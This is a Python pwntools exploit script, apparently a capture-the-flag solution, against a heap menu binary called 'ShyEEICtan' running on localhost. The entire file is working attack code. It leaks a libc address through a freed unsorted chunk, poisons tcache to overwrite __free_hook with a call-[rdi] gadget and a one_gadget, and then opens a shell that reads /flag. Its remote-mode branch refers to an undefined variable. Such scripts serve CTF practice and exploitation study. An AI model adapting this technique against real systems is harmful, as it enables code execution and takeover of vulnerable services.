#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./ShyEEICtan"

rhp2 = {'host':"localhost",'port':12346}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

off_arena96_libc = 0x3ebca0
off_free_hook = 0x3ed8e8
off_malloc_hook = 0x3ebc30
onegadgets = [0x4f2c5,0x4f322,0x10a38c]
callrdi_gad = 0x1d45f1

def _add(conn,data):
  conn.recvuntil("> ")
  conn.sendline("1")
  conn.recvuntil(">")
  conn.send(data)

def _remove(conn,ix):
  conn.recvuntil("> ")
  conn.sendline("2")
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _list(conn):
  conn.recvuntil("> ")
  conn.sendline("3")

def _exit(conn):
  conn.recvuntil("> ")
  conn.sendline("0")

def _edit(conn,ix,data):
  conn.recvuntil("> ")
  conn.sendline("4")
  conn.recvuntil("> ")
  conn.sendline(str(ix))
  conn.recvuntil(">")
  conn.send(data)


def exploit(conn):
  #consume tcache
  for i in range(8):
    _add(conn,"A"*0x10)
  for i in range(1,8):
    _remove(conn,i)
  _remove(conn,0) #generate main_arena+96 on heap
  _list(conn) #leak main_arena+96

  #calc some addrs
  conn.recvuntil("is:\n")
  mainarena96 = unpack(conn.recvuntil(" ...")[:-4])
  print("[+]mainarena96: "+hex(mainarena96))
  libc_base = mainarena96-off_arena96_libc
  print("[+]libc_base: "+hex(libc_base))
  malloc_hook = libc_base + off_malloc_hook
  free_hook = libc_base + off_free_hook
  print("[+]__malloc_hook: "+hex(malloc_hook))
  onegadget0 = libc_base + onegadgets[0]
  print("[+]onegadget0: "+hex(onegadget0))

  #make tcache point to __free_hook and overwrite it with call[rdi]-gadgets,
  #because just calling onegadget is interrupted with MOVAPS!
  #So, just do easy ROP with the argment of free()
  _edit(conn,7,p64(free_hook))
  _add(conn,"C"*0x10)
  _add(conn,p64(libc_base + callrdi_gad)) #gad: call qword [rdi]
  _edit(conn,5,p64(onegadget0))
  conn.recvuntil("> ")
  conn.sendline("2")

  #invoke gadgets and get the shell!
  conn.recvuntil("> ")
  conn.sendline("5")
  sleep(1)
  conn.sendline("ls")
  sleep(1)
  conn.sendline("cat /flag")



if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

